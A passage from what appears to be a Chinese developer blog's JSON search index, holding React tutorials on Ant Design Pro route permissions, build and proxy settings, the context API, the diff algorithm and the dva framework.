&#x27;#f0f2f5&#x27;,&#125;;...\n\n十四、权限管理\n只需要在配置菜单的时候配置上准入身份，在登录成功以后获取到登陆者身份以后更新登录人身份参数即可\n\n权限组件 Authorized\n这是脚手架权限管理的基础，基本思路是通过比对当前权限与准入权限，决定展示正常渲染内容还是异常内容\n\n控制菜单和路由显示\n\n如需对某些页面进行权限控制，只须在路由配置文件 router.config.js 中设置 authority 属性即可，代表该路由的准入权限，pro 的路由系统中会默认包裹 Authorized 进行判断处理。\n\n&#123;  path: &#x27;/form&#x27;,  icon: &#x27;form&#x27;,  name: &#x27;form&#x27;,  routes:[&#123;    path: &#x27;/form/basic-form&#x27;,    name: &#x27;basicform&#x27;,    component: &#x27;./Forms/BasicForm&#x27;,  &#125;, &#123;    path: &#x27;/form/step-form&#x27;,    name: &#x27;stepform&#x27;,    component: &#x27;./Forms/StepForm&#x27;,    authority: [&#x27;guest&#x27;], // 配置准入权限，可以配置多个角色  &#125;, &#123;    path: &#x27;/form/advanced-form&#x27;,    name: &#x27;advancedform&#x27;,    component: &#x27;./Forms/AdvancedForm&#x27;,    authority: [&#x27;admin&#x27;], // 配置准入权限，可以配置多个角色  &#125;],&#125;\n\n控制页面元素显示\n使用 Authorized 或Authorized.Secured 可以很方便地控制元素&#x2F;组件的渲染。https://pro.ant.design/components/Authorized#Authorized.Secured\n\ndemo关于权限简介\n用邮箱自己注册账户（注册后可以登录但是没有任何权限）guest\n联系管理员分配权限（分配后可以查看有权限的页面）\n每次登录后获取最新的权限身份（如：admin，user，guest）\n\n\n在src/router.js中会发现如下代码\n\n&lt;AuthorizedRoute    path=&quot;/&quot;    render=&#123;props =&gt; &lt;BasicLayout &#123;...props&#125; /&gt;&#125;    authority=&#123;[&#x27;admin&#x27;, &#x27;user&#x27;, &#x27;guest&#x27;]&#125;    redirectPath=&quot;/user/login&quot;/&gt;\n\n\n其中authority对象就是准入身份的数组，表示只有这些身份的人可以登录，我们在配置的时候一定不要忘记在这更新我们新增的身份\n\n\n然后就是menu.js,如下，展示了我们在配置菜单的时候怎么配身份\n\nconst menuData = [&#123;  name: &#x27;题库管理&#x27;,  path: &#x27;question&#x27;,  icon: &#x27;warning&#x27;,  authority: [&#x27;admin&#x27;, &#x27;user&#x27;],  children: [&#123;    name: &#x27;题库列表&#x27;,    path: &#x27;list&#x27;,  &#125;, &#123;    name: &#x27;编辑题目&#x27;,    path: &#x27;create-question&#x27;,    hideInMenu: true,  &#125;, &#123;    name: &#x27;科目管理&#x27;  &#125;]&#125;, &#123;  name: &#x27;账号管理&#x27;,  icon: &#x27;warning&#x27;,  path: &#x27;account&#x27;,  children: [&#123;    name: &#x27;账号列表&#x27;,    path: &#x27;list&#x27;,    authority: &#x27;admin&#x27;,  &#125;, &#123;    name: &#x27;建设中&#x27;,    path: &#x27;&#x27;,    authority: [&#x27;admin&#x27;, &#x27;user&#x27;],  &#125;]&#125;]\n\n\n登录成功以后怎么获取权限了\n\neffects：&#123;* login(&#123;payload&#125;, &#123;call, put&#125;) &#123;      const response = yield call(login, payload);      yield put(&#123;        type: &#x27;changeLoginStatus&#x27;,        payload: response,      &#125;);      // 登录成功以后更新权限，跳转页面      if (response &amp;&amp; response.code === &#x27;0000&#x27;) &#123;        reloadAuthorized();        yield put(routerRedux.push(&#x27;/&#x27;));      &#125;    &#125;,&#125;，reducers: &#123;    changeLoginStatus(state, &#123;payload&#125;) &#123;      let _status = &quot;ok&quot;;      let _user = &quot;admin&quot;;      setToken(&quot;token&quot;);      setAuthority(_user);//设置权限      return &#123;        ...state,        status: _status,        type: &#x27;account&#x27;,      &#125;;    &#125;,  &#125;\n\n\n我们看看setAuthority、reloadAuthorized这两个方法都做了什么事儿\n\n//设置身份export function setAuthority(authority) &#123;  return localStorage.setItem(&#x27;antd-pro-authority&#x27;, authority);&#125;//获取身份export function getAuthority() &#123;  return localStorage.getItem(&#x27;antd-pro-authority&#x27;);&#125;\n\n\n如此而且，只是把新的身份值存在localStorage里边，注意getAuthority，下边会用到\n\nimport RenderAuthorized from &#x27;../components/Authorized&#x27;;import &#123; getAuthority &#125; from &#x27;./authority&#x27;;let Authorized = RenderAuthorized(getAuthority());const reloadAuthorized = () =&gt; &#123;  Authorized = RenderAuthorized(getAuthority());&#125;;export &#123; reloadAuthorized &#125;;export default Authorized;RenderAuthorized: (currentAuthority: string | () =&gt; string) =&gt; Authorized\n\n\n权限组件默认 export RenderAuthorized 函数，它接收当前权限作为参数，返回一个权限对象，该对象提供以下几种使用方式\n\nAuthorized\n\n最基础的权限控制\n\n\n\n\n参数\n说明\n\n\n\nchildren\n正常渲染的元素，权限判断通过时展示\n\n\nauthority\n准入权限&#x2F;权限判断\n\n\nnoMatch\n权限异常渲染元素，权限判断不通过时展示\n\n\nAuthorized.AuthorizedRoute\n\n\n\n参数\n说明\n\n\n\nauthority\n准入权限&#x2F;权限判断\n\n\nredirectPath\n权限异常时重定向的页面路由\n\n\nAuthorized.Secured\n\n注解方式，[@Authorized.Secured](mailto:@Authorized.Secured)(authority, error)&#96;\n\n\n\n\n参数\n说明\n\n\n\nauthority\n准入权限&#x2F;权限判断\n\n\nerror\n权限异常时渲染元素\n\n\nAuthorized.check\n\n函数形式的 Authorized，用于某些不能被 HOC 包裹的组件。 Authorized.check(authority, target, Exception)\n\n\n注意：传入一个 Promise 时，无论正确还是错误返回的都是一个 ReactClass\n\n\n\n\n参数\n说明\n\n\n\nauthority\n准入权限&#x2F;权限判断\n\n\ntarget\n权限判断通过时渲染的元素\n\n\nException\n权限异常时渲染元素\n\n\n十五、构建和发布构建\n\n当项目开发完毕，只需要运行一行命令就可以打包你的应用：\n\n$ npm run build\n\n\n由于 Ant Design Pro 使用的工具 Umi 已经将复杂的流程封装完毕，构建打包文件只需要一个命令 umi build，构建打包成功之后，会在根目录生成 dist 文件夹，里面就是构建打包好的文件，通常是 .js、.css、index.html 等静态文件\n\n分析构建文件体积\n\n如果你的构建文件很大，你可以通过 analyze 命令构建并分析依赖模块的体积分布，从而优化你的代码。\n\n$ npm run analyze\n\n发布\n\n对于发布来讲，只需要将最终生成的静态文件，也就是通常情况下 dist 文件夹的静态文件发布到你的 cdn 或者静态服务器即可，需要注意的是其中的 index.html 通常会是你后台服务的入口页面，在确定了 js 和 css 的静态之后可能需要改变页面的引入路径\n\n前端路由与服务端的结合\n\nAnt Design Pro 使用的 Umi 支持两种路由方式：browserHistory 和 hashHistory。\n\n\n可以在 config/config.js 中进行配置选择用哪个方式：\n\nexport default &#123;  history: &#x27;hash&#x27;, // 默认是 browser&#125;\n\n十六、一些问题在ant-design-pro中解决跨域办法\n需要在配置文件中(.webpackrc)加入如下代码\n\n&quot;proxy&quot;: &#123;  &quot;/api&quot;: &#123;    &quot;target&quot;: &quot;http://xxx:xx/&quot;,    &quot;changeOrigin&quot;: true,    &quot;pathRewrite&quot;: &#123; &quot;^/api&quot; : &quot;&quot; &#125;  &#125;&#125;,\n\n\n需要注意的是此处不是将/api/代理到正式请求/api/中，（例如请求/api/users则会代理到http://xxx:xx/users）如果需要多次代理且需要代理到不同的服务器则可以在配置文件中进行如下配置\n\n&quot;proxy&quot;: &#123;      &quot;/test&quot;: &#123;        &quot;target&quot;: &quot;http://xxx:xx/&quot;,        &quot;changeOrigin&quot;: true,        &quot;pathRewrite&quot;: &#123; &quot;^/test&quot; : &quot;&quot; &#125;      &#125;,      &quot;/cross&quot;: &#123;        &quot;target&quot;: &quot;http://jsonplaceholder.typicode.com&quot;,        &quot;changeOrigin&quot;: true,        &quot;pathRewrite&quot;: &#123;&quot;^/cross&quot;: &quot;&quot;&#125;      &#125; // 此处有一点需要注意，不能在最后一个代理对象后面加逗号，否则会报错！！！  &#125;,\n\n在model中怎么同时发起多次请求\n因为yield将异步请求转为同步请求了，所以请求会按照同步顺序依次执行，使请求时间延长\n\n错误写法\n// effects将按顺序执行const response = yield call(fetch, &#x27;/users&#x27;);const res = yield call(fetch, &#x27;/roles&#x27;);\n\n正确写法\n// effects将会同步执行const [response, res] = yield [  call(fetch, &#x27;/users&#x27;),  call(fetch, &#x27;/roles&#x27;),]","categories":["框架"],"tags":["React"]},{"title":"React context","url":"/2019/11/23/React/React-context/","content":"简介\nReact 组件之间的通信是基于 props 的单向数据流，即父组件通过 props 向子组件传值，亦或是子组件执行传入的函数来更新父组件的state，这都满足了我们大部分的使用场景\n一般地，对于兄弟组件之间的通信，是通过它们共同的祖先组件进行的，即 Lifting State Up，官方文档也有介绍。组件一通过事件将状态变更通知它们共同的祖先组件，祖先组再将状态同步到组件二\n但是，如果组件之间嵌套的比较深，即使提升状态到共同父组件，再同步状态到相应的组件还是需要一层一层的传递下去，可能会比较繁琐\n在对应的场景中，context 就可以缩短父组件到子组件的属性传递路径\n\n例1import Parent from &#x27;./Parent&#x27;import ChildOne from &#x27;../components/ChildOne&#x27;import ChildTwo from &#x27;../components/ChildTwo&#x27;export default class Container extends React.Component &#123;    constructor(props) &#123;        super(props);        this.state = &#123; value: &#x27;&#x27; &#125;    &#125;    changeValue = value =&gt; &#123;        this.setState(&#123; value &#125;)    &#125;    getChildContext() &#123;        return &#123;            value: this.state.value,            changeValue: this.changeValue        &#125;    &#125;    render() &#123;        return (            &lt;div&gt;                &lt;Parent&gt;                    &lt;ChildOne /&gt;                &lt;/Parent&gt;                &lt;Parent&gt;                    &lt;ChildTwo /&gt;                &lt;/Parent&gt;            &lt;/div&gt;        )    &#125;&#125;Container.childContextTypes = &#123;    value: PropTypes.string,    changeValue: PropTypes.func&#125;\n\nParent.jsx\nimport React from &quot;react&quot;const Parent = (props) =&gt; (    &lt;div &#123;...props&#125; /&gt;)export default Parent\n\nChildOne.jsx\nexport default class ChildOne extends React.Component &#123;    handleChange = (e) =&gt; &#123;        const &#123; changeValue &#125; = this.context        changeValue(e.target.value)    &#125;    render() &#123;        return (            &lt;div&gt;                子组件一                &lt;input onChange=&#123;this.handleChange&#125; /&gt;            &lt;/div&gt;        )    &#125;&#125;ChildOne.contextTypes = &#123;    changeValue: PropTypes.func&#125;\n\nChildTwo.jsx\nexport default class ChildTwo extends React.Component &#123;    render() &#123;        return (            &lt;div&gt;                子组件二                &lt;p&gt;&#123;this.context.value&#125;&lt;/p&gt;            &lt;/div&gt;        )    &#125;&#125;ChildTwo.contextTypes = &#123;    value: PropTypes.string&#125;\n\n\n在 Container.childContextTypes 中进行接口的声明，通过 getChildContext 返回更新后的state，在 Child.contextTypes 中声明要获取的接口，这样在子组件内部就能通过 this.context 获取到。通过 Context 这样一个中间对象，ChildOne 和 ChildTwo 就可以相互通信了\n\n例2\n组件嵌套传递属性，在导航里面引用Page中的变量\n\n\n使用context来传递\n使用props层级传递\n\n\n使用context组件需要定义propTypes,需要严格校验、声明类型、字段\n\nclass Page extends React.Component &#123;    static childContextTypes = &#123;       user:PropTypes.string    &#125;    constructor(props)&#123;        super(props)        this.state = &#123;user:&#x27;poetries&#x27;&#125;    &#125;    getChildContext()&#123;        return this.state    &#125;    render()&#123;        return (          &lt;div&gt;            &lt;p&gt;我是&#123;this.state.user&#125;&lt;/p&gt;            &lt;Siderbar /&gt;          &lt;/div&gt;        )    &#125;&#125;class Siderbar extends React.Component &#123;    static childContextTypes = &#123;       user:PropTypes.string    &#125;    render()&#123;        return (          &lt;div&gt;            &lt;p&gt;侧边栏&lt;/p&gt;            &lt;Navbar /&gt;          &lt;/div&gt;        )    &#125;&#125;class Navbar extends React.Component &#123;    static childContextTypes = &#123;       user:PropTypes.string    &#125;    render()&#123;        return (          &lt;div&gt;            &lt;p&gt;我是&#123;this.context.user&#125;的导航栏&lt;/p&gt;            &lt;Siderbar /&gt;          &lt;/div&gt;        )    &#125;&#125;\n\ncontext在Provider种应用\nprovider`组件就是使用`context`，把`store`放到`context`里，所有的子元素可以直接取到`store\n\nimport PropTypes from &#x27;prop-types&#x27;class Provider extends Component &#123;    static childContextTypes = &#123;        store:Protypes.object    &#125;    constructor(props,context)&#123;        super(props,context)        this.store = props.store    &#125;    getChildContext()&#123;        //把传进来的store放进全局        return &#123;store:this.store&#125;    &#125;    render()&#123;        return this.props.children    &#125;&#125;\n\n\nconnect 负责连接组件，给到redux里的数据放到组件的属性里\n\n\n负责接收一个组件，把state里的一些数据放进去，返回一个组件\n数据变化的时候，能够通知组件\n\n//高阶组件写法const connect = (mapStateToProps=state=&gt;state,mapDispatchToProps=&#123;&#125;)=&gt;(wrapperComponent)=&gt;&#123;    return class ConnectComponent extends React.Component &#123;        //负责接收组件        static contextTypes = &#123;            store:PropTypes.obejct        &#125;        constructor(props)&#123;            super(props, context)&#123;                this.state = &#123;                    props:&#123;&#125;                &#125;            &#125;        &#125;        componentDidMount()&#123;            const &#123;store&#125; = this.context            store.subscribe(()=&gt;this.update())            this.update()        &#125;        update()&#123;            //  获取mapStateToProps、mapDispatchToProps 放入this.props里                        const &#123;store&#125;=this.context            const stateProps = mapStateToProps(store.getState())            const dispatchProps = bindActionCreators(mapDispatchProps,store.dispatch)            this.setState(&#123;                props:&#123;                    ...this.state.props,                    ...stateProps,                    ...dispatchProps                 &#125;            &#125;)        &#125;        render()&#123;            // 把数据放入            return &lt;wrapperComponent &#123;...this.state.props&#125;/&gt;        &#125;    &#125;&#125;\n\n","categories":["框架"],"tags":["React"]},{"title":"React-diff原理","url":"/2019/12/05/React/React-diff%E5%8E%9F%E7%90%86/","content":"一、是什么跟Vue一致，React通过引入Virtual DOM的概念，极大地避免无效的Dom操作，使我们的页面的构建效率提到了极大的提升\n而diff算法就是更高效地通过对比新旧Virtual DOM来找出真正的Dom变化之处\n传统diff算法通过循环递归对节点进行依次对比，效率低下，算法复杂度达到 O(n^3)，react将算法进行一个优化，复杂度姜维O(n)，两者效率差距如下图：\n\n二、原理react中diff算法主要遵循三个层级的策略：\n\ntree层级\nconponent 层级\nelement 层级\n\ntree层级DOM节点跨层级的操作不做优化，只会对相同层级的节点进行比较\n\n只有删除、创建操作，没有移动操作，如下图：\n\nreact发现新树中，R节点下没有了A，那么直接删除A，在D节点下创建A以及下属节点\n上述操作中，只有删除和创建操作\nconponent层级如果是同一个类的组件，则会继续往下diff运算，如果不是一个类的组件，那么直接删除这个组件下的所有子节点，创建新的\n\n当component D换成了component G 后，即使两者的结构非常类似，也会将D删除再重新创建G\nelement层级对于比较同一层级的节点们，每个节点在对应的层级用唯一的key作为标识\n提供了 3 种节点操作，分别为 INSERT_MARKUP(插入)、MOVE_EXISTING (移动)和 REMOVE_NODE (删除)\n如下场景：\n\n通过key可以准确地发现新旧集合中的节点都是相同的节点，因此无需进行节点删除和创建，只需要将旧集合中节点的位置进行移动，更新为新集合中节点的位置\n流程如下表：\n\n\nindex： 新集合的遍历下标。\noldIndex：当前节点在老集合中的下标\nmaxIndex：在新集合访问过的节点中，其在老集合的最大下标\n\n如果当前节点在新集合中的位置比老集合中的位置靠前的话，是不会影响后续节点操作的，这里这时候被动字节不用动\n操作过程中只比较oldIndex和maxIndex，规则如下：\n\n当oldIndex&gt;maxIndex时，将oldIndex的值赋值给maxIndex\n当oldIndex&#x3D;maxIndex时，不操作\n当oldIndex&lt;maxIndex时，将当前节点移动到index的位置\n\ndiff过程如下：\n\n节点B：此时 maxIndex&#x3D;0，oldIndex&#x3D;1；满足 maxIndex&lt; oldIndex，因此B节点不动，此时maxIndex&#x3D; Math.max(oldIndex, maxIndex)，就是1\n节点A：此时maxIndex&#x3D;1，oldIndex&#x3D;0；不满足maxIndex&lt; oldIndex，因此A节点进行移动操作，此时maxIndex&#x3D; Math.max(oldIndex, maxIndex)，还是1\n节点D：此时maxIndex&#x3D;1, oldIndex&#x3D;3；满足maxIndex&lt; oldIndex，因此D节点不动，此时maxIndex&#x3D; Math.max(oldIndex, maxIndex)，就是3\n节点C：此时maxIndex&#x3D;3，oldIndex&#x3D;2；不满足maxIndex&lt; oldIndex，因此C节点进行移动操作，当前已经比较完了\n\n当ABCD节点比较完成后，diff过程还没完，还会整体遍历老集合中节点，看有没有没用到的节点，有的话，就删除\n三、注意事项对于简单列表渲染而言，不使用key比使用key的性能，例如：\n将一个[1,2,3,4,5]，渲染成如下的样子：\n&lt;div&gt;1&lt;/div&gt;&lt;div&gt;2&lt;/div&gt;&lt;div&gt;3&lt;/div&gt;&lt;div&gt;4&lt;/div&gt;&lt;div&gt;5&lt;/div&gt;\n\n后续更改成[1,3,2,5,4]，使用key与不使用key作用如下：\n1.加key&lt;div key=&#x27;1&#x27;&gt;1&lt;/div&gt;             &lt;div key=&#x27;1&#x27;&gt;1&lt;/div&gt;     &lt;div key=&#x27;2&#x27;&gt;2&lt;/div&gt;             &lt;div key=&#x27;3&#x27;&gt;3&lt;/div&gt;  &lt;div key=&#x27;3&#x27;&gt;3&lt;/div&gt;  ========&gt;  &lt;div key=&#x27;2&#x27;&gt;2&lt;/div&gt;  &lt;div key=&#x27;4&#x27;&gt;4&lt;/div&gt;             &lt;div key=&#x27;5&#x27;&gt;5&lt;/div&gt;  &lt;div key=&#x27;5&#x27;&gt;5&lt;/div&gt;             &lt;div key=&#x27;4&#x27;&gt;4&lt;/div&gt;  操作：节点2移动至下标为2的位置，节点4移动至下标为4的位置。2.不加key&lt;div&gt;1&lt;/div&gt;             &lt;div&gt;1&lt;/div&gt;     &lt;div&gt;2&lt;/div&gt;             &lt;div&gt;3&lt;/div&gt;  &lt;div&gt;3&lt;/div&gt;  ========&gt;  &lt;div&gt;2&lt;/div&gt;  &lt;div&gt;4&lt;/div&gt;             &lt;div&gt;5&lt;/div&gt;  &lt;div&gt;5&lt;/div&gt;             &lt;div&gt;4&lt;/div&gt;  操作：修改第1个到第5个节点的innerText\n\n如果我们对这个集合进行增删的操作改成[1,3,2,5,6]\n1.加key&lt;div key=&#x27;1&#x27;&gt;1&lt;/div&gt;             &lt;div key=&#x27;1&#x27;&gt;1&lt;/div&gt;     &lt;div key=&#x27;2&#x27;&gt;2&lt;/div&gt;             &lt;div key=&#x27;3&#x27;&gt;3&lt;/div&gt;  &lt;div key=&#x27;3&#x27;&gt;3&lt;/div&gt;  ========&gt;  &lt;div key=&#x27;2&#x27;&gt;2&lt;/div&gt;  &lt;div key=&#x27;4&#x27;&gt;4&lt;/div&gt;             &lt;div key=&#x27;5&#x27;&gt;5&lt;/div&gt;  &lt;div key=&#x27;5&#x27;&gt;5&lt;/div&gt;             &lt;div key=&#x27;6&#x27;&gt;6&lt;/div&gt;  操作：节点2移动至下标为2的位置，新增节点6至下标为4的位置，删除节点4。2.不加key&lt;div&gt;1&lt;/div&gt;             &lt;div&gt;1&lt;/div&gt;     &lt;div&gt;2&lt;/div&gt;             &lt;div&gt;3&lt;/div&gt;  &lt;div&gt;3&lt;/div&gt;  ========&gt;  &lt;div&gt;2&lt;/div&gt;  &lt;div&gt;4&lt;/div&gt;             &lt;div&gt;5&lt;/div&gt;  &lt;div&gt;5&lt;/div&gt;             &lt;div&gt;6&lt;/div&gt; 操作：修改第1个到第5个节点的innerText\n\n由于dom节点的移动操作开销是比较昂贵的，没有key的情况下要比有key的性能更好\n","categories":["框架","React"],"tags":["React"]},{"title":"React dva总结","url":"/2019/12/12/React/React-dva/","content":"一、环境搭建$ npm install dva-cli -g# 创建应用$ dva new dva-quickstart# 启动$ npm start\n\n\nreact项目的推荐目录结构（如果使用dva脚手架创建，则自动生成如下）\n\n|── /mock/             # 数据mock的接口文件  |── /src/              # 项目源码目录（我们开发的主要工作区域）   |   |── /components/   # 项目组件（用于路由组件内引用的可复用组件）   |   |── /routes/       # 路由组件（页面维度） |   |  |── route1.js  |   |  |── route2.js   # 根据router.js中的映射，在不同的url下，挂载不同的路由组件|   |  └── route3.js    |   |── /models/       # 数据模型（可以理解为store，用于存储数据与方法）  |   |  |── model1.js  |   |  |── model2.js   # 选择分离为多个model模型，是根据业务实体进行划分|   |  └── model3.js  |   |── /services/     # 数据接口（处理前台页面的ajax请求，转发到后台）   |   |── /utils/        # 工具函数（工具库，存储通用函数与配置参数）     |   |── router.js       # 路由配置（定义路由与对应的路由组件）  |   |── index.js       # 入口文件  |   |── index.less      |   └── index.html     |── package.json       # 项目信息  └── proxy.config.js    # 数据mock配置\n\n使用 antd\nnpm i babel-plugin-import --save\n\n\nbabel-plugin-import 是用来按需加载 antd 的脚本和样式的\n\n\n编辑 .webpackrc，使 babel-plugin-import 插件生效\n\n&#123;+  &quot;extraBabelPlugins&quot;: [+    [&quot;import&quot;, &#123; &quot;libraryName&quot;: &quot;antd&quot;, &quot;libraryDirectory&quot;: &quot;es&quot;, &quot;style&quot;: &quot;css&quot; &#125;]+  ]&#125;\n\n二、初识Dva2.1 Dva的特性dva = React-Router + Redux + Redux-saga\n\n\n仅有 5 个API，仅有5个主要的api\n支持 HMR，支持模块的热更新\n支持 SSR (ServerSideRender)，支持服务器端渲染\n支持 Mobile/ReactNative，支持移动手机端的代码编写\n支持TypeScript\n支持路由和 Model 的动态加载\n\n2.2 Dva的五个API\n2.2.1 app &#x3D; dva(Opts)\napp = dva(Opts)：创建应用，返回 dva 实例。(注：dva 支持多实例)**\n\n在opts可以配置所有的hooks\nconst app = dva(&#123;     history,     initialState,     onError,     onAction,     onStateChange,     onReducer,     onEffect,     onHmr,     extraReducers,     extraEnhancers,&#125;);\n\n\nhooks包含如下配置项\n\n1、 onError((err, dispatch) =&gt; &#123;&#125;)\n\neffect 执行错误或 subscription 通过done 主动抛错时触发，可用于管理全局出错状态\n注意：subscription 并没有加 try...catch，所以有错误时需通过第二个参数 done 主动抛错\n\napp.model(&#123;  subscriptions: &#123;    setup(&#123; dispatch &#125;, done) &#123;      done(e)    &#125;,  &#125;,&#125;)\n\n2、 onAction(fn | fn[])\n\n在action被dispatch时触发，用于注册 redux 中间件。支持函数或函数数组格式\n\n\n例如我们要通过 redux-logger 打印日志\n\nimport createLogger from &#x27;redux-logger&#x27;;const app = dva(&#123;  onAction: createLogger(opts),&#125;)\n\n3、 onStateChange(fn)\n\nstate 改变时触发，可用于同步 state 到 localStorage，服务器端等\n\n4、 onReducer(fn)\n\n封装 reducer 执行，比如借助 redux-undo 实现 redo/undo\n\nimport undoable from &#x27;redux-undo&#x27;;const app = dva(&#123;  onReducer: reducer =&gt; &#123;    return (state, action) =&gt; &#123;      const undoOpts = &#123;&#125;;      const newState = undoable(reducer, undoOpts)(state, action);      // 由于 dva 同步了 routing 数据，所以需要把这部分还原      return &#123; ...newState, routing: newState.present.routing &#125;;    &#125;,  &#125;,&#125;)\n\n5、 onEffect(fn)\n\n封装 effect 执行。比如 dva-loading 基于此实现了自动处理 loading 状态\n\n6、 onHmr(fn)\n\n热替换相关，目前用于 babel-plugin-dva-hmr\n\n7、 extraReducers\n\n指定额外的 reducer，比如 redux-form 需要指定额外的 form reducer\n\nimport &#123; reducer as formReducer &#125; from &#x27;redux-form&#x27;const app = dva(&#123;  extraReducers: &#123;    form: formReducer,  &#125;,&#125;)\n\n\n这里比较常用的是，history的配置，一般默认的是hashHistory，如果要配置 history为 browserHistory，可以这样\n\nimport createHistory from &#x27;history/createBrowserHistory&#x27;;const app = dva(&#123;  history: createHistory(),&#125;);\n\n\ninitialState`：指定初始数据，优先级高于 `model` 中的 `state`，默认是 `&#123;&#125;`，但是基本上都在`modal`里面设置相应的`state\n\n2.2.2 app.use(Hooks)\napp.use(Hooks)：配置 hooks 或者注册插件\n\n这里最常见的就是dva-loading插件的配置\nimport createLoading from &#x27;dva-loading&#x27;;...app.use(createLoading(opts));\n\n\n但是一般对于全局的loading我们会根据业务的不同来显示相应不同的loading图标，我们可以根据自己的需要来选择注册相应的插件\n\n2.2.3 app.model(ModelObject)\napp.model(ModelObject)：这个是你数据逻辑处理，数据流动的地方\n\n\n2.2.4 app.unmodel(namespace)\n取消 model 注册，清理 reducers,effects 和 subscriptions。subscription 如果没有返回 unlisten 函数，使用 app.unmodel 会给予警告\n\n2.2.5 app.router(Function)\n注册路由表，这一操作步骤在dva中也很重要\n\n// 注册路由app.router(require(&#x27;./router&#x27;))// 路由文件import &#123; Router, Route &#125; from &#x27;dva/router&#x27;;import IndexPage from &#x27;./routes/IndexPage&#x27;import TodoList from &#x27;./routes/TodoList&#x27;function RouterConfig(&#123; history &#125;) &#123;  return (    &lt;Router history=&#123;history&#125;&gt;        &lt;Route path=&quot;/&quot; component=&#123;IndexPage&#125; /&gt;        &lt;Route path=&#x27;/todoList&#x27; components=&#123;TodoList&#125;/&gt;    &lt;/Router&gt;  )&#125;export default RouterConfig\n\n\n如果我们想解决组件动态加载问题，我们的路由文件也可以按照下面的写法来写\n\nimport &#123; Router, Switch, Route &#125; from &#x27;dva/router&#x27;import dynamic from &#x27;dva/dynamic&#x27;function RouterConfig(&#123; history, app &#125;) &#123;  const IndexPage = dynamic(&#123;    app,    component: () =&gt; import(&#x27;./routes/IndexPage&#x27;),  &#125;)  const Users = dynamic(&#123;    app,    models: () =&gt; [import(&#x27;./models/users&#x27;)],    component: () =&gt; import(&#x27;./routes/Users&#x27;),  &#125;)  return (    &lt;Router history=&#123;history&#125;&gt;      &lt;Switch&gt;        &lt;Route exact path=&quot;/&quot; component=&#123;IndexPage&#125; /&gt;        &lt;Route exact path=&quot;/users&quot; component=&#123;Users&#125; /&gt;      &lt;/Switch&gt;    &lt;/Router&gt;  )&#125;export default RouterConfig\n\n\n其中dynamic(opts) 中opt包含三个配置项：\n\n\napp: dva 实例，加载 models 时需要\nmodels: 返回 Promise 数组的函数，Promise返回 dva model&#96;\ncomponent：返回 Promise的函数，Promise返回 React Component\n\n2.2.6 app.start\n启动应用，即将我们的应用跑起来\n\n2.3 Dva九个概念2.3.1 State\n初始值，我们在 dva() 初始化的时候和在 modal 里面的 state 对其两处进行定义，其中 modal 中的优先级低于传给 dva() 的 opts.initialState\n\n// dva()初始化const app = dva(&#123;  initialState: &#123; count: 1 &#125;,&#125;);// modal()定义事件app.model(&#123;  namespace: &#x27;count&#x27;,  state: 0,&#125;);\n\n2.3.2 Action\n表示操作事件，可以是同步，也可以是异步\n\n\naction 的格式如下，它需要有一个 type，表示这个 action 要触发什么操作；payload 则表示这个 action 将要传递的数据\n\n&#123;  type: String,  payload: data,&#125;\n\n\n我们通过 dispatch 方法来发送一个 action\n\ndispatch(&#123; type: &#x27;todos/add&#x27;, payload: &#x27;Learn Dva&#x27; &#125;);\n\n\n其实我们可以构建一个Action 创建函数，如下\n\nfunction addTodo(text) &#123;  return &#123;    type: ADD_TODO,    text  &#125;&#125;//我们直接dispatch(addTodo()),就发送了一个action。dispatch(addTodo())\n\n2.3.3 Model\nmodel 是 dva 中最重要的概念，Model 非 MVC 中的 M，而是领域模型，用于把数据相关的逻辑聚合到一起，几乎所有的数据，逻辑都在这边进行处理分发\n\nimport queryString from &#x27;query-string&#x27;import * as todoService from &#x27;../services/todo&#x27;export default &#123;  namespace: &#x27;todo&#x27;,  state: &#123;    list: []  &#125;,  reducers: &#123;    save(state, &#123; payload: &#123; list &#125; &#125;) &#123;      return &#123; ...state, list &#125;    &#125;  &#125;,  effects: &#123;    *addTodo(&#123; payload: value &#125;, &#123; call, put, select &#125;) &#123;      // 模拟网络请求      const data = yield call(todoService.query, value)      console.log(data)      let tempList = yield select(state =&gt; state.todo.list)      let list = []      list = list.concat(tempList)      const tempObj = &#123;&#125;      tempObj.title = value      tempObj.id = list.length      tempObj.finished = false      list.push(tempObj)      yield put(&#123; type: &#x27;save&#x27;, payload: &#123; list &#125;&#125;)    &#125;,    *toggle(&#123; payload: index &#125;, &#123; call, put, select &#125;) &#123;      // 模拟网络请求      const data = yield call(todoService.query, index)      let tempList = yield select(state =&gt; state.todo.list)      let list = []      list = list.concat(tempList)      let obj = list[index]      obj.finished = !obj.finished      yield put(&#123; type: &#x27;save&#x27;, payload: &#123; list &#125; &#125;)    &#125;,    *delete(&#123; payload: index &#125;, &#123; call, put, select &#125;) &#123;      const data = yield call(todoService.query, index)      let tempList = yield select(state =&gt; state.todo.list)      let list = []      list = list.concat(tempList)      list.splice(index, 1)      yield put(&#123; type: &#x27;save&#x27;, payload: &#123; list &#125; &#125;)    &#125;,    *modify(&#123; payload: &#123; value, index &#125; &#125;, &#123; call, put, select &#125;) &#123;      const data = yield call(todoService.query, value)      let tempList = yield select(state =&gt; state.todo.list)      let list = []      list = list.concat(tempList)      let obj = list[index]      obj.title = value      yield put(&#123; type: &#x27;save&#x27;, payload: &#123; list &#125; &#125;)    &#125;  &#125;,  subscriptions: &#123;    setup(&#123; dispatch, history &#125;) &#123;      // 监听路由的变化，请求页面数据      return history.listen((&#123; pathname, search &#125;) =&gt; &#123;        const query = queryString.parse(search)        let list = []        if (pathname === &#x27;todoList&#x27;) &#123;          dispatch(&#123; type: &#x27;save&#x27;, payload: &#123;list&#125; &#125;)        &#125;      &#125;)    &#125;  &#125;&#125;\n\n\nmodel对象中包含5个重要的属性\n\nstate\n\n这里的 state 跟我们刚刚讲的 state 的概念是一样的，只不过她的优先级比初始化的低，但是基本上项目中的 state 都是在这里定义的\n\nnamespace\n\nmodel` 的命名空间，同时也是他在全局 `state` 上的属性，只能用字符串，我们发送在发送 `action` 到相应的 `reducer` 时，就会需要用到 `namespace\n\nReducer\n\n以key/value 格式定义 reducer，用于处理同步操作，唯一可以修改 state 的地方。由 action 触发。其实一个纯函数\n\nnamespace: &#x27;todo&#x27;,  state: &#123;    list: []  &#125;,  // reducers 写法  reducers: &#123;    save(state, &#123; payload: &#123; list &#125; &#125;) &#123;      return &#123; ...state, list &#125;    &#125; &#125;\n\nEffect\n\n用于处理异步操作和业务逻辑，不直接修改 state，简单的来说，就是获取从服务端获取数据，并且发起一个 action交给reducer 的地方\n\n其中它用到了redux-saga，里面有几个常用的函数。\n// effects 写法effects: &#123;    *addTodo(&#123; payload: value &#125;, &#123; call, put, select &#125;) &#123;      